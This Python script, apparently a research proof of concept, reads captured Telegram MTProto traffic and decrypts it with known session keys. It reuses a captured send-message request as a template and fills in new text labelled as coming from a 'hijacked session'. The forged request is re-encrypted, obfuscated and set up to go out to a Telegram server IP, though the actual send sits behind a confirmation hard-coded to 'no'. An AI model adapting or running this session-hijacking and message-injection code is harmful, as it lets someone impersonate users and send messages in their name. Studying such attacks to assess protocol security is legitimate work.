from telethon.tl.functions.messages import SendMessageRequest

from src.MtprotoSession import KeyNotFoundException
from read_capture import *


def send_edited_message(data : str, last_outgoing_message :TGMessage, template_message, peer_id_and_hash = (None, None)):
    session = last_outgoing_message.session

    template_message.message = data
    template_message.random_id = -1 * random.randrange(0, 1<<63)
    # decoded_message.peer.user_id = 740952845
    if peer_id_and_hash[0] is not None and peer_id_and_hash[1] is not None:
        template_message.peer.user_id = peer_id_and_hash[0]
        template_message.peer.access_hash = peer_id_and_hash[1]
    # print(decoded_message)
    decoded_edited_message = bytes(template_message)
    tg_message_to_send = TGMessage(plaintext_bytes=bytearray(decoded_edited_message), session=session,
                                   msg_type="client_msg", silent=True, colored=True,
                                   instant=True, quickAck = True)

    print("MESSAGE TO SEND")
    print(tg_message_to_send)
    # print(to_hex_str(tg_message_to_send.message_data_plaintext))
    # print(deserialize_TL_message(decoded_edited_message).to_dict())
    cipher_obf_enc, cipher_obf_dec, init = create_obfuscation_ciphers(0xef)
    obfuscated_bytes = cipher_obf_enc.encrypt(tg_message_to_send.complete_bytes_ciphertext)

    init_and_obfuscated_bytes = init + obfuscated_bytes
    # confirm = input("Are you sure? yes/(no)")
    confirm = "no"
    if confirm == "yes":
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect(("149.154.167.91", 443))
        client_socket.send(init_and_obfuscated_bytes)
        print("\nMessage sent.")
        # sleep(3)

    cipher_obf_enc, cipher_obf_dec, init = derive_deobfuscation_ciphers(init_and_obfuscated_bytes)
    print(to_hex_str(init))
    deobfuscated_bytes = bytearray(cipher_obf_enc.decrypt(init_and_obfuscated_bytes[64:]))
    print(to_hex_str(tg_message_to_send.plaintext))
    message = TGMessage(ciphertext_bytes = deobfuscated_bytes, msg_type="client_msg", silent=True, colored=True, instant=True, session = MtprotoSession(session.auth_key))
    print(deserialize_TL_message(message.message_data_plaintext).to_dict())
    print(to_hex_str(message.plaintext))
    print(to_hex_str(last_outgoing_message.seqNo))

    print("Salt:")
    print(to_hex_str(message.session.salt))
    print("Session ID:")
    print(to_hex_str(message.session.session_id))
    print("SeqNo:")
    print(bytes_to_int(message.seqNo, little= True))



def main():
    template_send_message = None
    stream_n = 2
    streams_with_outgoing_traffic = []
    for i in range(100):
        print("")
        print(f"Stream {i}\n")
        try:
            stream = (read_stream(str(f"capture/stream_{i}_out"), str(f"capture/stream_{i}_in"), False, False))
            if len(stream[0]) > 0:
                streams_with_outgoing_traffic.append(stream)
            dir = 0
            for direction in stream:
                print("INCOMING:" if dir > 0 else "OUTGOING:")
                dir = 1
                for message in direction:
                    print (message)
                    print("---------------------------------------------------")
                    if isinstance(message.deserialized_message, SendMessageRequest):
                        template_send_message = message
        except KeyNotFoundException as e:
            print("(stream is irrelevant)") # stream is irrelevant
        except FileNotFoundError:
            break # no more streams to examine
    if template_send_message is not None:
        send_edited_message("messaggio da sessione dirottata",streams_with_outgoing_traffic[-1][0][-1], template_send_message.deserialized_message)


    # if template_send_message is None:
    #     print("Error, no template message found")
    # else:
    #     send_edited_message("messaggio da una sessione hijackata", outgoing_messages[-1], template_send_message)
    #     pass


if __name__ == "__main__":
    main()